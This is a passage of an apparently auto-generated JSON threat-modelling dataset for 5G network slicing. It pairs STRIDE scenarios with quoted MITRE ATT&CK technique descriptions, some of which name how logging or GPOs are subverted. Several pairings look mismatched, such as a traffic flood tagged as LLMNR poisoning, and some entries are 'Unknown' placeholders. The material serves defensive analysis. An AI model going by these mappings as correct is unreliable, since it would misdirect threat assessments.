                    "Condition": "Success in initial attack vectors"
                },
                {
                    "Assumption": "No additional access controls to validate admin access",
                    "Role": "Network Administrator",
                    "Condition": "Lack of access review mechanisms"
                }
            ],
            "Potential Impact": "Potential full control over network slices, leading to wide-ranging disruptions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerabilities",
                "orchestration platform",
                "admin access"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An internal user exploits misconfigurations to gain unauthorized access to VNFs.",
            "Assumptions": [
                {
                    "Assumption": "Misconfiguration issues within the VNF access controls",
                    "Role": "Network Administrator",
                    "Condition": "Improperly configured access policies"
                },
                {
                    "Assumption": "Internal user knowledge of the VNF management system",
                    "Role": "Internal User",
                    "Condition": "Access to internal system documentation"
                },
                {
                    "Assumption": "Lack of monitoring for internal access patterns",
                    "Role": "Network Administrator",
                    "Condition": "Absence of access pattern analysis"
                }
            ],
            "Potential Impact": "Unchecked access leading to potential data tampering or misuse.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "access controls",
                "internal user",
                "misconfiguration"
            ],
            "mitre_technique": {
                "name": "Group Policy Modification",
                "description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)",
                "id": "attack-pattern--5d2be8b9-d24c-4e98-83bf-2f5f79477163",
                "technique_id": "T1484.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromised external interfaces are used to escalate privileges within the network.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces lack stringent access controls",
                    "Role": "System Architect",
                    "Condition": "Weak interface security policies"
                },
                {
                    "Assumption": "The attacker has initial access to the external interface",
                    "Role": "Attacker",
                    "Condition": "Breached initial interface security"
                },
                {
                    "Assumption": "No effective mechanisms for interface access review",
                    "Role": "Network Administrator",
                    "Condition": "Inadequate interface use monitoring"
                }
            ],
            "Potential Impact": "Escalated privileges giving attackers broad access to network functionalities.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "external interfaces",
                "network",
                "access escalation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "3",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actor imitates a legitimate Network Function (NF) to gain access to sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "The malicious actor has access to the network segment where the NF is located.",
                    "Role": "Malicious actor",
                    "Condition": "Access to network segment"
                },
                {
                    "Assumption": "Authentication mechanisms between NFs are weak or compromised.",
                    "Role": "Network administration",
                    "Condition": "Weak/Compromised authentication"
                },
                {
                    "Assumption": "Systems do not employ mutual authentication for communication between NFs.",
                    "Role": "System architect",
                    "Condition": "No mutual authentication"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data, potential data exfiltration.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker disguises as an authorized service provider through an external interface.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept or influence external communications.",
                    "Role": "Attacker",
                    "Condition": "Intercept communications"
                },
                {
                    "Assumption": "External interfaces lack proper authentication mechanisms.",
                    "Role": "System designer",
                    "Condition": "Weak external interface authentication"
                },
                {
                    "Assumption": "Service providers are not regularly verified for authenticity.",
                    "Role": "Network operator",
                    "Condition": "No regular verification"
                }
            ],
            "Potential Impact": "Impersonation allowing unauthorized access to services and data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "external interface",
                "service provider"
            ],
            "mitre_technique": {
                "name": "Trusted Relationship",
                "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
                "id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
                "technique_id": "T1199"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker uses fake credentials to access orchestration and management systems.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has obtained or generated valid credentials.",
                    "Role": "Attacker",
                    "Condition": "Credentials compromise"
                },
                {
                    "Assumption": "The access control mechanisms are insufficient to detect fraudulent access.",
                    "Role": "Security administrator",
                    "Condition": "Insufficient access controls"
                },
                {
                    "Assumption": "There is no multi-factor authentication enforced.",
                    "Role": "System architect",
                    "Condition": "No multi-factor authentication"
                }
            ],
            "Potential Impact": "Unauthorized control over network slices and resource allocation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credentials",
                "orchestration"
            ],
            "mitre_technique": {
                "name": "Pluggable Authentication Modules",
                "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
                "technique_id": "T1556.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies VNFs to disrupt network slice operations.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has write access to the VNF environment.",
                    "Role": "Attacker",
                    "Condition": "Write access to VNFs"
                },
                {
                    "Assumption": "VNF update and deployment processes lack validation checks.",
                    "Role": "Network manager",
                    "Condition": "No validation checks"
                },
                {
                    "Assumption": "Logging and monitoring do not detect unauthorized changes.",
                    "Role": "Security admin",
                    "Condition": "Insufficient monitoring"
                }
            ],
            "Potential Impact": "Data corruption, disruption of network slice functionality.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "VNF",
                "network slice"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies orchestration commands to allocate excessive resources to a network slice.",
            "Assumptions": [
                {
                    "Assumption": "The attacker gains access to orchestration system commands.",
                    "Role": "Attacker",
                    "Condition": "Unauthorized access"
                },
                {
                    "Assumption": "Commands are not authenticated or verified before execution.",
                    "Role": "System architect",
                    "Condition": "No command verification"
                },
                {
                    "Assumption": "Access controls do not restrict unauthorized command execution.",
                    "Role": "Security admin",
                    "Condition": "Weak access controls"
                }
            ],
            "Potential Impact": "Overconsumption of resources leading to service degradation.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "orchestration",
                "resource allocation"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into edge computing nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the ability to deploy code on edge nodes.",
                    "Role": "Attacker",
                    "Condition": "Code deployment capability"
                },
                {
                    "Assumption": "There are no integrity checks on the software running on edge nodes.",
                    "Role": "System designer",
                    "Condition": "No integrity checks"
                },
                {
                    "Assumption": "Monitoring and logging do not detect anomalous behavior.",
                    "Role": "Security admin",
                    "Condition": "Insufficient anomaly detection"
                }
            ],
            "Potential Impact": "Compromise of data integrity and availability of services at the edge nodes.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "edge computing",
                "code injection"
            ],
            "mitre_technique": {
                "name": "Reflective Code Loading",
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
                "id": "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a",
                "technique_id": "T1620"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A network operator denies having changed the configuration of a network slice.",
            "Assumptions": [
                {
                    "Assumption": "System lacks proper logging and non-repudiation controls.",
                    "Role": "System designer",
                    "Condition": "No non-repudiation controls"
                },
                {
                    "Assumption": "Changes to configurations are not audited.",
                    "Role": "Security admin",
                    "Condition": "No auditing mechanisms"
                },
                {
                    "Assumption": "There is no verification process for administrative actions.",
                    "Role": "Network manager",
                    "Condition": "No verification process"
                }
            ],
            "Potential Impact": "Difficult to track changes, potential for unauthorized or erroneous configurations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "configuration",
                "logging"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An external partner denies sending a malicious request through an external interface.",
            "Assumptions": [
                {
                    "Assumption": "There is no mechanism to authenticate and log external requests.",
                    "Role": "System architect",
                    "Condition": "No external request logging"
                },
                {
                    "Assumption": "Monitoring of external interfaces is inadequate.",
                    "Role": "Security admin",
                    "Condition": "Inadequate monitoring"
                },
                {
                    "Assumption": "There is no mutual consent or verification process for incoming requests.",
                    "Role": "Network operator",
                    "Condition": "No mutual consent"
                }
            ],
            "Potential Impact": "Difficult to attribute malicious actions, potential for policy violations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "external interface",
                "logging"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Logs",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
                "technique_id": "T1562.008"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user within the network cannot be held accountable for actions taken within the VNFs due to lack of proper session tracking.",
            "Assumptions": [
                {
                    "Assumption": "User actions are not logged with sufficient detail.",
                    "Role": "System admin",
                    "Condition": "Insufficient logging detail"
                },
                {
                    "Assumption": "There is no session tracking or user-specific auditing.",
                    "Role": "Security admin",
                    "Condition": "No session/user auditing"
                },
                {
                    "Assumption": "Systems do not enforce unique user identification.",
                    "Role": "System architect",
                    "Condition": "No unique user ID enforcement"
                }
            ],
            "Potential Impact": "Difficulty in tracking and holding users accountable, potential insider threat.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "VNF",
                "session tracking"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is exposed due to an unsecured external interface.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces do not enforce encryption for data in transit.",
                    "Role": "System architect",
                    "Condition": "No encryption for data in transit"
                },
                {
                    "Assumption": "Sensitive data policies are not enforced strictly on external interfaces.",
                    "Role": "Security admin",
                    "Condition": "Lax data policies"
                },
                {
                    "Assumption": "There is poor monitoring of data flows through external interfaces.",
                    "Role": "Network operator",
                    "Condition": "Inadequate data flow monitoring"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "external interface",
                "data encryption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted communications between NFs.",
            "Assumptions": [
                {
                    "Assumption": "Communications between NFs are not encrypted.",
                    "Role": "System designer",
                    "Condition": "No encryption"
                },
                {
                    "Assumption": "The attacker has access to the network segment where NF communications occur.",
                    "Role": "Attacker",
                    "Condition": "Network segment access"
                },
                {
                    "Assumption": "Monitoring and detection mechanisms are insufficient to detect interception.",
                    "Role": "Security admin",
                    "Condition": "Insufficient monitoring"
                }
            ],
            "Potential Impact": "Exposure of sensitive network configurations and data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A malicious entity gains access to cloud computing nodes storing sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud nodes are not properly secured or segmented.",
                    "Role": "System architect",
                    "Condition": "Poor security segmentation"
                },
                {
                    "Assumption": "Access controls and authentication mechanisms in the cloud environment are weak.",
                    "Role": "Security admin",
                    "Condition": "Weak access controls"
                },
                {
                    "Assumption": "Sensitive data is not encrypted at rest in the cloud.",
                    "Role": "Data security admin",
                    "Condition": "No encryption at rest"
                }
            ],
            "Potential Impact": "Unauthorized access to confidential information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud computing",
                "data encryption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms a network slice with excessive traffic.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can generate substantial traffic directed at the network slice.",
                    "Role": "Attacker",
                    "Condition": "Traffic generation capability"
                },
                {
                    "Assumption": "Traffic management and rate-limiting mechanisms are insufficient.",
                    "Role": "Network operator",
                    "Condition": "Insufficient rate-limiting"
                },
                {
                    "Assumption": "Monitoring and detection systems do not identify the attack quickly.",
                    "Role": "Security admin",
                    "Condition": "Slow detection"
                }
            ],
            "Potential Impact": "Degradation or unavailability of affected network slice services.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network slice",
                "traffic"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against 